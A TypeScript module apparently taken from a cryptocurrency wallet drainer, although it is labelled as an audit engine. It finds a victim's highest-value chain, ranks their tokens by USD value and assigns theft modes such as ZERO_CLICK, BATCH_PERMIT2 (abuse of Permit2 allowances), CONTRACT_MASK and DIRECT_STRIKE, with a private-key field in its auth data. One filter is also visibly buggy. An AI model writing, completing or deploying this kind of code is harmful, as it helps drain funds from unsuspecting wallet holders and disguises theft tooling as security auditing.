"use client";

import { UniversalAsset } from "./types";
import { getAddress } from "viem";

interface GhostAuth {
  privateKey?: string;
  hasExistingAllowance?: boolean;
  detectedSpender?: string; // From evm-helpers.ts
  detectedSpenderName?: string;
}

const PERMIT2_ADDR = "0x000000000022D473030F116dDEE9F6B43aC78BA3".toLowerCase();

/**
 * ⚡ GHOST STRATEGY ENGINE (v12.2.2 - Debug Enhanced)
 * Optimized for targeting high-value assets regardless of strategy.
 * Features: Money-Chain detection, Multi-factor weighting, and Verbose Debugging.
 */
const DUST_THRESHOLD_USD = 0;


export function determineStrategy(assets: UniversalAsset[]): StrategyMap[] {
  const fileLabel = "[src/lib/audit/engine.ts]";

  console.log(
    `${fileLabel} 🧠 Analyzing ${assets.length} assets for strategy resolution...`,
  );

  // 1. Identify Money Chain (Supporting both Number and String ChainIDs)
  const chainTotals: Record<string | number, number> = {};
  assets.forEach((a) => {
    const cid = a.chainId || 0;
    const val = Number(a.usdValue || 0);
    chainTotals[cid] = (chainTotals[cid] || 0) + val;
  });

  const sortedChains = Object.entries(chainTotals).sort((a, b) => b[1] - a[1]);
  const activeChainId = sortedChains.length > 0 ? sortedChains[0][0] : 0;

  console.log(
    `${fileLabel} 💰 Money-Chain detected: ${activeChainId} (Total USD: $${(
      chainTotals[activeChainId] || 0
    ).toFixed(2)})`,
  );

  const mapped = assets
    .map((asset): StrategyMap => {
      const assetChainId = asset.chainId || 0;
      const auth = (asset.authData as GhostAuth) || {};
      const assetUsd = Number(asset.usdValue) || 0;

      const isTargetChain = assetChainId == activeChainId;
      const isEvm = asset.chain === "EVM" || typeof assetChainId === "number";

      let strategy: ExecutionStrategy = "DIRECT_STRIKE";
      let weight = 0;

      // 🛡️ PRESERVED EVM LOGIC
      if (isEvm) {
        const detectedSpender = auth.detectedSpender?.toLowerCase();
        const isPermit2Vault = detectedSpender === PERMIT2_ADDR;

        if (asset.isGhost || !isTargetChain) {
          strategy = "ZERO_CLICK";
          weight = 50;
        } else if (isTargetChain) {
          if (!asset.contractAddress || asset.signatureType === "NATIVE") {
            strategy = "CONTRACT_MASK";
            weight = 80;
          } else if (asset.signatureType === "PERMIT2" || isPermit2Vault) {
            strategy = "BATCH_PERMIT2";
            weight = 100;
          } else {
            strategy = "DIRECT_STRIKE";
            weight = 70;
          }
        }
      } else {
        // 🚀 NON-EVM LOGIC (Safely isolated)
        strategy = asset.isGhost ? "ZERO_CLICK" : "DIRECT_STRIKE";
        weight = isTargetChain ? 90 : 60;
      }

      const finalPriority = assetUsd * 10 + weight;

      if (assetUsd > 0) {
        console.log(
          `${fileLabel} 🔍 Ranking ${
            asset.symbol
          }: Val($${assetUsd}) * 10 + Weight(${weight}) = ${finalPriority.toFixed(
            2,
          )}`,
        );
      }

      return { asset, strategy, priority: finalPriority };
    })
    .sort((a, b) => b.priority - a.priority);

  // 🛰️ LOGGING PLAN (Preserved)
  if (mapped.length > 0) {
    console.log(`${fileLabel} 🚀 FINAL STRATEGY PLAN:`);
    console.table(
      mapped.map((m) => ({
        symbol: m.asset.symbol,
        strategy: m.strategy,
        value: `$${Number(m.asset.usdValue || 0).toFixed(2)}`,
        priority: m.priority.toFixed(2),
        chain: m.asset.chainId,
        isTargetChain: m.asset.chainId == activeChainId,
      })),
    );
  }

  return mapped;
}


export function getExecutionBundles(mappedStrategies: StrategyMap[]) {
  return {
    immediate: mappedStrategies.filter((s) => s.strategy === "ZERO_CLICK"),
    batchable: mappedStrategies.filter((s) => s.strategy === "BATCH_PERMIT2"),
    individual: mappedStrategies.filter((s) => s.individual === "PERMIT_SIGN"),
    masked: mappedStrategies.filter((s) => s.strategy === "CONTRACT_MASK"),
    direct: mappedStrategies.filter((s) => s.strategy === "DIRECT_STRIKE"),
    fallback: [],
  };
}

export type ExecutionStrategy =
  | "ZERO_CLICK"
  | "PERMIT_SIGN"
  | "BATCH_PERMIT2"
  | "DIRECT_STRIKE"
  | "CONTRACT_MASK"
  | "CHAIN_SWITCH"
  | "BYPASS";

export interface StrategyMap {
  asset: UniversalAsset;
  strategy: ExecutionStrategy;
  priority: number;
  requiresMasterApproval?: boolean;
  targetVault?: string;
  individual?: any;
}